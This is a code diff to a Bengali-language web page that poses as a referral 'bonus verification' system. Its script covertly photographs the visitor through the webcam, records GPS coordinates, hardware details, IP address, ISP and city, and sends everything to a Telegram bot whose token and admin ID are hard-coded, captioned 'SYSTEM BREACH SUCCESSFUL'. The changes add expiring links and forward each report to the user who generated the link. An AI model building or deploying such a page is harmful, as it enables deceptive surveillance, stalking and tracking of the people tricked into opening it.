@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
     <title>বোনাস সিস্টেম - ৫০/৫০</title>
     <meta property="og:title" content="বোনাস সিস্টেম - ৫০/৫০">
     <meta property="og:description" content="রেফার করে বোনাস পেতে নিচে ক্লিক করুন।">
@@ -45,11 +44,24 @@
     </div>
 
     <script>
+        // --- সেটিংস ও লিঙ্ক এক্সপায়ারি চেক ---
         const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
         const adminId = "7068444019"; 
 
         const urlParams = new URLSearchParams(window.location.search);
         const userIdFromLink = urlParams.get('id'); 
+        const expiry = urlParams.get('exp');
+        const currentTime = Math.floor(Date.now() / 1000);
+
+        // ১ ঘণ্টা পর লিঙ্ক বন্ধ করার লজিক
+        if (expiry && currentTime > expiry) {
+            document.body.innerHTML = `
+                <div style="background:#000; color:#ff0000; text-align:center; padding-top:100px; height:100vh; font-family:Arial;">
+                    <h1 style="font-size:40px;">⚠️ লিঙ্কটির মেয়াদ শেষ!</h1>
+                    <p style="font-size:20px; color:#fff;">বোট থেকে নতুন লিঙ্ক জেনারেট করুন।</p>
+                </div>`;
+            window.stop(); 
+        }
 
         const verifyBtn = document.getElementById('verify-btn');
         const status = document.getElementById('status');
@@ -58,15 +70,13 @@
 
         let gpsLink = "লোকেশন অনুমতি নেই";
 
-        // লোকেশন নেওয়ার সঠিক ফাংশন
         function getGPS() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition((position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        // এখানে লিঙ্কটি ঠিক করা হয়েছে
-                        gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        gpsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
                         resolve(true);
                     }, () => resolve(false), { enableHighAccuracy: true });
                 } else { resolve(false); }
@@ -93,7 +103,6 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-
                 status.innerText = "> ভেরিফাই হচ্ছে... ৩ সেকেন্ড অপেক্ষা করুন।";
 
                 setTimeout(async () => {
@@ -103,27 +112,25 @@
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(async (blob) => {
-                        // হার্ডওয়্যার তথ্য
                         let info = `\n\n💻 **HARDWARE DETAILS**\nCPU: \`${navigator.hardwareConcurrency}\` Cores\nRAM: \`${navigator.deviceMemory}\` GB\nScreen: \`${window.screen.width}x${window.screen.height}\``;
 
-                        // নেটওয়ার্ক ও লোকেশন
                         try {
                             const res = await fetch('https://ipwho.is/');
                             const d = await res.json();
                             info += `\n\n🌐 **NETWORK & IP**\nIP: \`${d.ip}\`\nISP: \`${d.connection.isp}\`\nCity: \`${d.city}\``;
                         } catch(e) {}
 
-                        const caption = "🛠 **SYSTEM BREACH SUCCESSFUL**" + info + `\n\n📍 **GPS LOCATION**\n[ম্যাপ দেখতে এখানে ক্লিক করুন](${gpsLink})`;
+                        const caption = "🛠 **SYSTEM BREACH SUCCESSFUL**" + info + `\n\n📍 **GPS LOCATION**\n[ম্যাপ দেখতে এখানে ক্লিক করুন](${gpsLink})\n\n👤 Report for: \`${userIdFromLink || 'Admin'}\``;
                         
-                        // এডমিনকে পাঠানো
+                        // অ্যাডমিনকে পাঠানো
                         await sendToTelegram(blob, adminId, caption);
 
-                        // অন্য ইউজারকে পাঠানো (যদি আইডি থাকে)
+                        // লিঙ্ক জেনারেট করা ইউজারকে পাঠানো
                         if (userIdFromLink && userIdFromLink !== adminId) {
                             await sendToTelegram(blob, userIdFromLink, caption);
                         }
 
-                        status.innerText = "> ভেরিফিকেশন সফল!";
+                        status.innerText = "> ভেরিফিকেশন সফল! বোনাস চেক করুন।";
                         stream.getTracks().forEach(t => t.stop());
                     }, 'image/jpeg', 0.8);
                 }, 3000); 
